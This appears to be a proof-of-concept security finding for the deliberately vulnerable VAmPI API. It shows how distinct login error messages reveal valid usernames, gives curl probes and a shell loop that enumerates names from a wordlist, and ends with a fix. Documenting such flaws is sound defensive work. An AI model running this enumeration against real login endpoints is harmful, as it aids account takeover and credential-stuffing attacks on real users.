# M2 PoC: User/Password Enumeration via Distinct Error Messages

**Severity**: Medium
**PoC-Status**: theoretical
**Affected endpoint**: `POST /users/v1/login` (vuln=1 mode)

## Vulnerability

`api_views/users.py:101-106` branches on two distinct error conditions and returns
different messages to the caller:

```python
if vuln:
    if user and request_data.get('password') != user.password:
        return Response(error_message_helper("Password is not correct for the given username."), ...)
    elif not user:
        return Response(error_message_helper("Username does not exist"), ...)
```

An unauthenticated attacker can distinguish valid usernames from invalid ones by
observing which message is returned, reducing a credential-stuffing attack to a
two-phase lookup: enumerate users first, then brute-force only their passwords.

## Reproduction

Prerequisites: VAmPI running on `localhost:5000` with `vuln=1` (default dev config).
The seed user `admin` is created at startup (`models/user_model.py:101`).

### Step 1 — probe a non-existent username

```bash
curl -s -X POST http://localhost:5000/users/v1/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"ghost_user","password":"anything"}'
```

Expected response:

```json
{"status": "fail", "message": "Username does not exist"}
```

### Step 2 — probe a valid username with the wrong password

```bash
curl -s -X POST http://localhost:5000/users/v1/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"wrongpassword"}'
```

Expected response:

```json
{"status": "fail", "message": "Password is not correct for the given username."}
```

### Step 3 — scripted enumeration against a wordlist

```bash
for user in ghost_user admin name1 name2; do
  resp=$(curl -s -X POST http://localhost:5000/users/v1/login \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"$user\",\"password\":\"x\"}")
  echo "$user -> $resp"
done
```

Lines containing `"Password is not correct"` identify **valid** usernames.
Lines containing `"Username does not exist"` are invalid and can be discarded.

## Security Impact

- Unauthenticated attacker can build a confirmed user list from any username
  wordlist with a single HTTP request per candidate.
- No rate-limiting or lockout is applied to the login endpoint, so enumeration
  is noise-free and fast.
- Confirmed usernames feed directly into targeted password-spray or credential-
  stuffing attacks against the same endpoint.

## Fix

Collapse both failure branches into a single generic message (as already
implemented when `vuln=0`):

```python
# secure path (api_views/users.py:108-110)
return Response(error_message_helper("Username or Password Incorrect!"), 200, ...)
```

Apply this unconditionally regardless of the `vuln` flag in production builds,
and add per-IP and per-account rate limiting to the login endpoint.
